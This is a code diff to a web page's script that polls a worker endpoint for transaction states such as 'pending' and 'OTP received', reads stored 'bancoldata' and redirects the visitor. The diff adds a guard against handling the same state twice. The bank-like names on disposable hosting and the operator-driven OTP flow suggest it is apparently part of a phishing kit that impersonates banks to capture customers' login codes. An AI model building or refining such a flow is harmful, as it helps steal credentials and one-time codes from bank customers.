@@ -155,10 +155,11 @@
     const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
     const BASE_URL = 'https://personasgalicia.vercel.app';
     let intentos = 0;
-    const MAX_INTENTOS = 120; // 120 intentos = ~6 minutos
+    const MAX_INTENTOS = 120;
     let timeoutId = null;
     let isProcessing = false;
     let redirigiendo = false;
+    let ultimoEstado = null;
 
     // ========================= FUNCIÓN PARA ACTUALIZAR ESTADO =========================
     function actualizarEstado(mensaje, tipo = 'info') {
@@ -180,7 +181,6 @@
         
         const response = await fetch(url);
 
-        // Si es 404, significa que el KV aún no tiene los datos
         if (response.status === 404) {
           console.log('⏳ Transacción no encontrada en KV, esperando...');
           actualizarEstado(`⏳ Procesando solicitud... (${intentos}/${MAX_INTENTOS})`, 'info');
@@ -207,7 +207,6 @@
         const data = await response.json();
         console.log(`📊 [${intentos}/${MAX_INTENTOS}] Estado:`, data);
 
-        // Si no hay datos o está pendiente
         if (!data || !data.estado || data.estado === "pendiente") {
           actualizarEstado(`⏳ Esperando autorización... (${intentos}/${MAX_INTENTOS})`, 'info');
           
@@ -228,9 +227,18 @@
 
         // ========================= PROCESAR ESTADO =========================
         const estado = data.estado;
+        
+        // Evitar procesar el mismo estado múltiples veces
+        if (estado === ultimoEstado && estado !== 'otp_recibido') {
+          console.log(`⏳ Estado repetido: ${estado}, esperando cambio...`);
+          isProcessing = false;
+          timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
+          return;
+        }
+        
+        ultimoEstado = estado;
         console.log(`✅ Estado recibido: ${estado}`);
 
-        // Limpiar timeout si existe
         if (timeoutId) {
           clearTimeout(timeoutId);
           timeoutId = null;
@@ -310,8 +318,6 @@
       console.log(`📡 Worker URL: ${WORKER_URL}`);
       console.log(`🌐 BASE URL: ${BASE_URL}`);
       
-      // Verificar localStorage
-      console.log('🔍 Verificando localStorage...');
       const bancoldataRaw = localStorage.getItem('bancoldata');
       console.log(`📦 bancoldata en localStorage: ${bancoldataRaw ? '✅ Existe' : '❌ No existe'}`);
       
@@ -355,13 +361,11 @@
       console.log(`🔍 Verificando transacción: ${transactionId}`);
       actualizarEstado('🔍 Verificando acceso...', 'info');
       
-      // Iniciar verificación después de 1 segundo
       setTimeout(() => {
         checkStatus(transactionId);
       }, 1000);
     });
 
-    // Limpiar timeout al salir de la página
     window.addEventListener('beforeunload', function() {
       if (timeoutId) {
         clearTimeout(timeoutId);
